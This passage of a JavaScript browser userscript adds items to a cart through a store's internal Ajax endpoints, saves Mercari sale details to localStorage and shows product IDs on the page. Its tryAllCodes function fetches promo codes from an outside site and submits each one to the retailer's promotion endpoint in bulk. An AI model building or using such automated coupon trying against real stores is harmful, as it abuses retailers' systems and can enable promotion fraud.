        ids.item.qty=1;
    
    var u = urler();
    if(typeof(itm)!='undefined') { ids.item.pid=itm; }
    if(typeof(qty)!='undefined') { ids.item.qty=qty; }
    if(typeof(sid)!='undefined') { ids.item.storeid=sid; }
    if(typeof(cat)!='undefined') { ids.item.catalog=cid; }
    if(typeof(url)!='undefined') { u=urler(url); }
        
    var url={};
    
        url.host = u.host;
        url.path = "/webapp/wcs/stores/servlet/AjaxOrderChangeServiceItemAdd";
        url.query="?storeId="+ids.storeid+"&catalogId="+ids.catalog+"&langId=-1&orderId=.&catEntryId_1="+ids.item.pid+"&quantity_1="+ids.item.qty;
    
    var url=url.host+url.path+url.query;
    
    var addItem2Cart = await fetch(url);
    var cartResponse = await addItem2Cart.text();
    
    var cleanResponse=cartResponse.replaceAll(/[\t\n]/g,"").substr(2,cartResponse.replaceAll(/[\t\n]/g,"").length-4);
    var responseJSON=JSON.parse(cleanResponse);
    var cartArr=Object.values(responseJSON);
        
            if(cartArr.length==2 && typeof(responseJSON['orderId']) !='undefined' && typeof(responseJSON['orderItemId']) !='undefined')
            {
                console.log("%c SUCCESSFULLY ADDED!\n"+responseJSON['orderId']+": "+responseJSON['orderItemId'],winStyle);
    			return "Added";
            }
            else
            {
                console.log("%c Failed to add: \n"+responseJSON.errorMessage,failStyle);
    			return responseJSON.errorMessage;
            }
}



async function addCode2cartIBM(code,orderNumber) 
{
    if(typeof(orderNumber)=='undefined') { var orderNumber=document.querySelector('input[type=hidden][name=orderId]').value; }
        var bodyStr="orderId="+orderNumber+"&taskType=A&URL=&storeId=20002&catalogId=11051&langId=-1&finalView=AjaxOrderItemDisplayView&promoCode="+code;
        var url=location.origin+"/webapp/wcs/stores/servlet/AjaxPromotionCodeManage";
        var req=await fetch(url,{"headers":{"content-type": "application/x-www-form-urlencoded"},"body": bodyStr,"method": "POST"});
        var res=await req.text();
        var cleanResponse=res.replaceAll(/[\t\n]/g,"").substr(2,res.replaceAll(/[\t\n]/g,"").length-4);
        var responseJSON=JSON.parse(cleanResponse);
        var cartArr=Object.values(responseJSON);        
        
        if(cartArr.length==2 && typeof(responseJSON['orderId']) !='undefined' && typeof(responseJSON['orderItemId']) !='undefined')
        {
            //console.log("%c SUCCESSFULLY ADDED!\n"+responseJSON['orderId'],winStyle);
			return "Added";
        }
        else
        {
            //console.log("%c Failed to add: \n"+responseJSON.errorMessage,failStyle);
			return responseJSON.errorMessage.substr(0,360);
		
		}
}



	
	


 
 
 
 
 
 

if(shopHosts.includes(location.host) && document.querySelector('orderSent')==null && location.pathname=='/shop/OrderShippingBillingConfirmationView' && typeof(dataLayer)=="object")
{
	orderPlaced(dataLayer);
}






/////////////////////////////////////////////////////////////Mercari/////////////////////////////////////////////////////////////
function saveMercariOrder2Local() 
{
    var send={};
send.orderid=document.querySelector('[data-testid=OrderDetails-Value]').innerText;
send.soldOn=document.querySelector('[data-testid=ItemSoldTime]').innerText.replaceAll(/Sold on /gmi,"");
send.listedPrice=parseFloat(document.querySelector('[data-testid=ItemPrice]').innerText.replaceAll(/[^\d\.-]/gmi,""));
send.shippingFee=parseFloat(document.querySelector('[data-testid=Shipping-fee-value]').innerText.replaceAll(/[^\d\.-]/gmi,""));
send.sellingFee=parseFloat(document.querySelector('[data-testid=Selling-fee-value]').innerText.replaceAll(/[^\d\.-]/gmi,""));
send.processFee=parseFloat(document.querySelector('[data-testid=Processing-fee-value').innerText.replaceAll(/[^\d\.-]/gmi,""));
send.netPay=parseFloat(document.querySelector('[data-testid=You-made-value]').innerText.replaceAll(/[^\d\.-]/gmi,""));
var dateParts=send.soldOn.split(/\//);
var saleDateParts=[];
    saleDateParts['mm'] = dateParts[0].padStart(2,"0");
    saleDateParts['dd'] = dateParts[1].padStart(2,"0");
    saleDateParts['yyyy'] = dateParts[2];
send.sqlDate=saleDateParts['yyyy']+'-'+saleDateParts['mm']+'-'+saleDateParts['dd'];
send.listingURL = document.querySelector('[data-testid=ItemThumbImage]').href;


var mercari={};
    if(typeof(localStorage.mercari)=='string')
	{
			mercari=JSON.parse(localStorage.mercari); 
		mercari[send.orderid] =JSON.stringify(send);
		localStorage.mercari=JSON.stringify(mercari);
    }
	return mercari;
}



setTimeout(()=>
{
	if(location.host=="www.mercari.com" && location.pathname.match(/transaction\/order_status\/m/gmi)!=null)
	{
		console.log("Saving ORder...");
		var mercari=saveMercariOrder2Local();
	}
},1200);


async function tryAllCodes(value)
{
    
	var url="https://phones.wtf/orders/?codes&"+location.host.split(/\./)[1]+"&json";
    if(typeof(value)=="number" && (value == 50 || value == 100 || value == 150 || value == 200 || value == 300))
	{
		url+="&value="+value;
	}
	var codesJSON=await fetch(url).then(response=>{ var r= response.json(); return r; });
    var codesPromise=[];
    var arrCodes=Object.keys(codesJSON);
    var totalCodes=arrCodes.length;
    var retVal=await arrCodes.forEach(async(code,n)=>
    { 
           if(shopHosts.includes(location.host)) 
		   { 
				codesPromise[code] = await addCode2cartIBM(code).then((response)=>{ console.log(response); return response; });
		   }
		   if(aemHosts.includes(location.host))
		   {
				codesPromise[code] = await tryCode(code).then((response)=>{ console.log(response); return response; });
		   }
				if(n==totalCodes-1) 
				{
				//setTimeout(()=>{ Promise.allSettled(codesPromise).then(x=>console.table(codesPromise)); },1000);
					return codesPromise;
				}
    });

    var retVal=await Promise.allSettled(codesPromise).then(x=>{ console.table(codesPromise);  return codesPromise; })
	return retVal;
}

function showId() {
var productId=document.querySelector('[data-sku]').dataset.productid;
var pidDiv=document.createElement('h1');
pidDiv.style='position:fixed; top:800px; left:20px; color:lime;';
pidDiv.innerText=productId;
document.body.appendChild(pidDiv);
}

if(document.querySelector('[data-sku]')!=null)
{
	showId();
}